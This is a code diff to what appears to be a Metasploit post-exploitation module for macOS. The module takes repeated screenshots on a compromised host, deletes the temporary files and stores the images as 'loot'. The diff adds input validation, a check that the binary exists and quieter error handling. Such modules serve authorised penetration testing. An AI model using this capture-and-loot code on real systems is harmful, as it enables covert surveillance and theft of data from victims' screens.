@@ -9,7 +9,7 @@ require 'rex'
 class Metasploit3 < Msf::Post
 
   include Msf::Post::File
-
+  include Msf::Auxiliary::Report
 
   def initialize(info={})
     super( update_info( info,
@@ -33,7 +33,7 @@ class Metasploit3 < Msf::Post
         ),
         OptInt.new('DELAY', [true, 'Interval between screenshots in seconds. 0 for no delay', 10]),
         OptInt.new('COUNT', [true, 'Number of screenshots to collect.', 1]),
-        OptString.new('TMP_PATH', [true, 'Path to remote temp directory', '/tmp/random']),
+        OptString.new('TMP_PATH', [true, 'Path to remote temp directory', '/tmp/<random>']),
         OptString.new('EXE_PATH', [true, 'Path to remote screencapture executable', '/usr/sbin/screencapture'])
       ], self.class)
 
@@ -41,40 +41,69 @@ class Metasploit3 < Msf::Post
 
   def run
     file_type = datastore['FILETYPE'].shellescape
-    tmp_path = datastore['TMP_PATH'].shellescape.gsub('random', Rex::Text.rand_text_alpha(8))
+    exe_path = datastore['EXE_PATH'].shellescape
+    tmp_path = datastore['TMP_PATH'].gsub('<random>', Rex::Text.rand_text_alpha(8)).shellescape
+    if datastore['COUNT'] < 1
+      count = 1
+    else
+      count = datastore['COUNT']
+    end
+    if datastore['DELAY'] < 0
+      delay = 0
+    else
+      delay = datastore['DELAY']
+    end
 
-    count = datastore['COUNT']
-    print_status "Capturing #{count} screenshots with a delay of #{datastore['DELAY']} seconds"
+    if not file?(exe_path)
+      print_error("Aborting, screencapture binary not found.")
+      return
+    end
+
+    print_status "Capturing #{count} screenshots with a delay of #{delay} seconds"
     # calculate a sane number of leading zeros to use.  log of x  is ~ the number of digits
     leading_zeros = Math::log10(count).round
     file_locations = []
+
     count.times do |num|
-      Rex.sleep(datastore['DELAY']) unless num == 0
+      Rex.sleep(delay) unless num <= 0
+
       begin
         # This is an OSX module, so mkdir -p should be fine
         cmd_exec("mkdir -p #{tmp_path}")
         filename = Rex::Text.rand_text_alpha(7)
-        file = tmp_path + "/" + filename
-        cmd_exec(datastore['EXE_PATH'].shellescape + " -C -t " + datastore['FILETYPE'].shellescape + " " + file)
+        file = "#{tmp_path}/#{filename}"
+        cmd_exec("#{exe_path} -C -t #{file_type} #{file}")
         data = read_file(file)
+        file_rm(file)
       rescue RequestError => e
-        print_error("Error taking the screenshot: #{e.class} #{e} #{e.backtrace}")
-        return false
+        print_error("Error taking the screenshot")
+        vprint_error("#{e.class} #{e} #{e.backtrace}")
+        return
       end
-      if data
-        begin
-          # let's loot it using non-clobbering filename, even tho this is the source filename, not dest
-          fn = "screenshot.%0#{leading_zeros}d.#{file_type}" % num
-          file_locations << store_loot("screen_capture.screenshot", "image/#{file_type}", session, data, fn, "Screenshot")
-        rescue IOError, Errno::ENOENT => e
-          print_error("Error storing screenshot: #{e.class} #{e} #{e.backtrace}")
-          return false
-        end
+
+      unless data
+        print_error("No data for screenshot #{num}")
+        next
       end
+
+      begin
+        # let's loot it using non-clobbering filename, even tho this is the source filename, not dest
+        fn = "screenshot.%0#{leading_zeros}d.#{file_type}" % num
+        location = store_loot("screen_capture.screenshot", "image/#{file_type}", session, data, fn, "Screenshot")
+        vprint_good("Screenshot #{num} saved on #{location}")
+        file_locations << location
+      rescue IOError, Errno::ENOENT => e
+        print_error("Error storing screenshot")
+        vprint_error("#{e.class} #{e} #{e.backtrace}")
+        return
+      end
+
     end
+
     print_status("Screen Capturing Complete")
     if file_locations and not file_locations.empty?
-      print_status "run loot -t screen_capture.screenshot to see file locations of your newly acquired loot"
+      print_status("Use \"loot -t screen_capture.screenshot\" to see file locations of your newly acquired loot")
     end
+
   end
 end
